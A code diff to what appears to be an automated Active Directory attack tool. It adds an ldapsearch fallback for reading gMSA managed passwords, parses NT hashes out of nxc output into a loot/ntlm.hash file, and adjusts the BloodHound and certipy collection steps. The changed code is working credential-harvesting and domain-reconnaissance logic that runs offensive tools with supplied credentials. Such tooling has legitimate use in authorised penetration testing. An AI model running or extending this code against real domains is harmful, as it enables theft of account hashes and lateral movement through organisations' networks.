@@ -234,26 +234,51 @@ def _check_gmsa(
     ip: str, domain: str, user: str, pw: str,
     runner: Runner, findings: Findings, ws: Workspace, available: set[str],
 ) -> None:
-    if "nxc" not in available:
-        return
-    cmd = ["nxc", "ldap", ip, "-u", user, "-p", pw, "-d", domain, "-M", "gmsa"]
     findings.h4("gMSA Passwords")
-    findings.cmd(" ".join(cmd))
-    out = runner.run(cmd, "creds_gmsa", timeout=30)
-    if "invalid choice: 'gmsa'" in out or ("invalid choice" in out and "'gmsa'" in out):
-        findings.note("gMSA module not available in this nxc version — skipping")
-        print(f"    [-] gMSA: module unavailable")
-        return
-    findings.code_block(_trim(out, lines=20))
-    for line in out.splitlines():
-        m = re.search(r"Account:\s*(\S+)\s+NTLM:\s*([0-9a-fA-F]{32})", line)
-        if m:
-            acct, nt_hash = m.group(1), m.group(2)
-            ws.add_cred(f"{acct}:{nt_hash}")
-            ws.append_hash_file("ntlm.hash", [f"{acct}:{nt_hash}"])
-            findings.bullet(f"**gMSA NT hash for `{acct}`:** `{nt_hash}`")
-            findings.add_summary(f"gMSA: {acct} NT hash in loot/ntlm.hash")
-            print(f"    [+] gMSA: {acct} NT hash obtained")
+
+    nxc_ok = False
+    if "nxc" in available:
+        cmd = ["nxc", "ldap", ip, "-u", user, "-p", pw, "-d", domain, "-M", "gmsa"]
+        findings.cmd(" ".join(cmd))
+        out = runner.run(cmd, "creds_gmsa", timeout=30)
+        if "invalid choice: 'gmsa'" in out or ("invalid choice" in out and "'gmsa'" in out):
+            findings.note("gMSA module not available in this nxc version — falling back to ldapsearch")
+            print(f"    [-] gMSA: nxc module unavailable, trying ldapsearch")
+        else:
+            nxc_ok = True
+            findings.code_block(_trim(out, lines=20))
+            for line in out.splitlines():
+                m = re.search(r"Account:\s*(\S+)\s+NTLM:\s*([0-9a-fA-F]{32})", line)
+                if m:
+                    acct, nt_hash = m.group(1), m.group(2)
+                    ws.add_cred(f"{acct}:{nt_hash}")
+                    ws.append_hash_file("ntlm.hash", [f"{acct}:{nt_hash}"])
+                    findings.bullet(f"**gMSA NT hash for `{acct}`:** `{nt_hash}`")
+                    findings.add_summary(f"gMSA: {acct} NT hash in loot/ntlm.hash")
+                    print(f"    [+] gMSA: {acct} NT hash obtained")
+
+    if not nxc_ok and "ldapsearch" in available and domain:
+        # Fallback: query gMSA accounts directly via LDAP
+        base_dn = "DC=" + ",DC=".join(domain.split("."))
+        uri = f"ldap://{ip}"
+        cmd_ld = [
+            "ldapsearch", "-x", "-H", uri,
+            "-D", f"{user}@{domain}", "-w", pw,
+            "-b", base_dn,
+            "(objectClass=msDS-GroupManagedServiceAccount)",
+            "sAMAccountName", "msDS-ManagedPassword",
+        ]
+        findings.cmd(" ".join(cmd_ld))
+        out_ld = runner.run(cmd_ld, "creds_gmsa_ldap", timeout=30)
+        findings.code_block(_trim(out_ld, lines=20))
+        accts = re.findall(r"sAMAccountName:\s+(\S+)", out_ld)
+        if accts:
+            findings.bullet(f"**gMSA accounts found:** {', '.join(accts)}")
+            findings.note("gMSA msDS-ManagedPassword requires elevated rights to read — note account names for post-escalation")
+            print(f"    [+] gMSA accounts: {', '.join(accts)}")
+        else:
+            findings.note("No gMSA accounts found or insufficient rights")
+            print(f"    [-] No gMSA accounts")
 
 
 def _bloodyad_writable(
@@ -797,7 +822,16 @@ def _ad_core(
             findings.cmd(" ".join(cmd))
             # Run from bh_dir so the zip is always written there regardless of
             # bloodhound-python version (older versions write zip to CWD not -o dir)
-            runner.run(cmd, label, timeout=300, cwd=str(bh_dir))
+            out = runner.run(cmd, label, timeout=300, cwd=str(bh_dir))
+
+            # Primary: parse the zip filename from "Compressing output into X.zip"
+            m = re.search(r"Compressing output into\s+(\S+\.zip)", out)
+            if m:
+                named = bh_dir / Path(m.group(1)).name
+                if named.exists() and named.stat().st_size > 1000:
+                    return named
+
+            # Fallback: find the largest zip in the directory
             zips = sorted(bh_dir.rglob("*.zip"), key=lambda z: z.stat().st_size, reverse=True)
             good = [z for z in zips if z.stat().st_size > 1000]
             return good[0] if good else None
@@ -918,25 +952,6 @@ def _ad_core(
             print(f"    [+] Vulnerable ADCS templates found (unparsed)")
         else:
             print(f"    [-] No vulnerable ADCS templates")
-
-        # certipy BloodHound output — generates ADCS-aware edges for BloodHound CE
-        bh_out = ws.loot_dir / "certipy_bloodhound"
-        cmd_bh = [
-            "certipy-ad", "find",
-            "-u", f"{user}@{domain}",
-            "-p", pw,
-            "-dc-ip", ip,
-            "-bloodhound",
-            "-output", str(bh_out),
-        ]
-        findings.cmd(" ".join(cmd_bh))
-        runner.run(cmd_bh, "creds_certipy_bloodhound", timeout=120)
-        bh_files = list(bh_out.parent.glob(f"{bh_out.name}*.json"))
-        if bh_files:
-            findings.bullet(f"**Certipy BloodHound output** → `loot/certipy_bloodhound*.json` ({len(bh_files)} files)")
-            print(f"        [+] Certipy BloodHound output: {len(bh_files)} file(s)")
-        else:
-            print(f"        [-] Certipy BloodHound output: no files generated")
 
     # 6a. Admin command execution — enumerate target via SMB exec using admin creds
     if admin_smb:
